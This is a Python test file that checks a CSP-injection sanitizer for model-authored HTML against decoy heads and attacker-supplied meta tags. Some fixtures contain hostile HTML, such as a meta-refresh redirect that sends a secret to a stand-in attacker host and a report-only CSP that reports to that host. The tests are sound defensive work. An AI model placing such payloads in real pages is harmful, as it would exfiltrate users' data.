"""Adversarial CSP-injection tests — close the regex-based bypass surface.

These cases all exercise the kinds of model-authored HTML that the previous
regex-only ``inject_csp`` would mis-handle. The new parser-based
implementation must:

  * Put the CSP meta tag inside the *real* ``<head>`` even when a decoy
    ``<head>`` sits inside an HTML comment, a ``<script>`` body, or a
    ``<template>`` body.
  * Strip every existing ``Content-Security-Policy`` meta tag (even
    creatively-spaced or report-only variants) before injecting our own.
  * Strip ``<meta http-equiv="refresh">`` and ``<meta http-equiv="X-Frame-Options">``.
  * Produce valid output even when the model omits ``<head>``.
"""

from __future__ import annotations

from claude_design.studio import inject_csp

_OUR_CSP_NEEDLE = "default-src 'none'"


def _find_real_head_index(html: str) -> int:
    """Return the byte offset of the first un-commented ``<head>`` open tag."""
    # Walk through, skipping comment regions.
    i = 0
    while i < len(html):
        if html.startswith("<!--", i):
            close = html.find("-->", i + 4)
            if close == -1:
                return -1
            i = close + 3
            continue
        if html[i : i + 5].lower() == "<head":
            return i
        i += 1
    return -1


def test_csp_skips_decoy_head_inside_comment():
    """A decoy <head> in an HTML comment must not catch the CSP."""
    html = (
        "<!doctype html>"
        "<!-- <head>not the real head</head> -->"
        "<html><head><title>real</title></head><body>x</body></html>"
    )
    out = inject_csp(html)
    csp_idx = out.find(_OUR_CSP_NEEDLE)
    real_head_idx = _find_real_head_index(out)
    assert csp_idx > real_head_idx > 0, (
        f"CSP at {csp_idx} but real <head> at {real_head_idx}; CSP escaped into the comment"
    )
    # The comment must remain intact — we don't rewrite it.
    assert "<!-- <head>not the real head</head> -->" in out


def test_csp_skips_decoy_head_inside_script_template():
    """A decoy <head> inside a <script type=\"text/template\"> body must not catch the CSP."""
    html = (
        "<!doctype html><html>"
        '<script type="text/template"><head>fake</head></script>'
        "<head><title>real</title></head><body>x</body></html>"
    )
    out = inject_csp(html)
    csp_idx = out.find(_OUR_CSP_NEEDLE)
    # The CSP must land in the real <head>, not in the script template.
    script_template_idx = out.find("<head>fake</head>")
    real_head_idx = out.find("<head>", script_template_idx + 1 if script_template_idx >= 0 else 0)
    assert csp_idx > real_head_idx > 0


def test_csp_strips_existing_csp_meta_even_with_spacing_variants():
    """A model-authored Content-Security-Policy meta must be removed before injection."""
    html = (
        "<!doctype html><html><head>"
        "  <meta http-equiv = 'Content-Security-Policy' content=\"default-src *\">  "
        "</head><body></body></html>"
    )
    out = inject_csp(html)
    # The model's wide-open CSP must be gone; only ours remains.
    assert out.count("Content-Security-Policy") == 1
    assert "default-src *" not in out
    assert _OUR_CSP_NEEDLE in out


def test_csp_strips_report_only_csp_meta():
    """A Content-Security-Policy-Report-Only meta must not be left behind."""
    html = (
        "<!doctype html><html><head>"
        '<meta http-equiv="Content-Security-Policy-Report-Only" content="default-src *; report-uri https://attacker/r">'
        "</head><body></body></html>"
    )
    out = inject_csp(html)
    assert "Content-Security-Policy-Report-Only" not in out
    assert "https://attacker/r" not in out
    assert _OUR_CSP_NEEDLE in out


def test_csp_strips_x_frame_options_meta():
    """A model-supplied <meta http-equiv=X-Frame-Options ALLOWALL> must be stripped."""
    html = (
        "<!doctype html><html><head>"
        '<meta http-equiv="X-Frame-Options" content="ALLOWALL">'
        "</head></html>"
    )
    out = inject_csp(html)
    assert "X-Frame-Options" not in out
    assert _OUR_CSP_NEEDLE in out


def test_csp_strips_meta_refresh():
    """A meta-refresh redirect must be stripped — CSP has no directive that covers it."""
    html = (
        "<!doctype html><html><head>"
        '<meta http-equiv="refresh" content="0;url=https://attacker/?x=secret">'
        "<title>x</title></head></html>"
    )
    out = inject_csp(html)
    assert "attacker" not in out
    assert _OUR_CSP_NEEDLE in out


def test_csp_strips_meta_refresh_case_variants():
    for case in ("REFRESH", "Refresh", "rEfReSh"):
        html = (
            f'<!doctype html><html><head><meta http-equiv="{case}" content="0;url=//x"></head></html>'
        )
        out = inject_csp(html)
        assert "//x" not in out, f"case {case!r} bypassed refresh strip"


def test_csp_synthesizes_head_when_missing():
    """If the doc has no <head>, we add one and put the CSP inside it."""
    html = "<!doctype html><html><body>just body</body></html>"
    out = inject_csp(html)
    assert _OUR_CSP_NEEDLE in out
    assert "<head>" in out


def test_csp_idempotent_on_repeat_injection():
    """Calling inject_csp twice must yield exactly one CSP meta tag."""
    html = "<!doctype html><html><head></head><body></body></html>"
    once = inject_csp(html)
    twice = inject_csp(once)
    assert twice.count("Content-Security-Policy") == 1
    # And the CSP should be in the same head, not duplicated or outside.
    assert twice.count("default-src 'none'") == 1
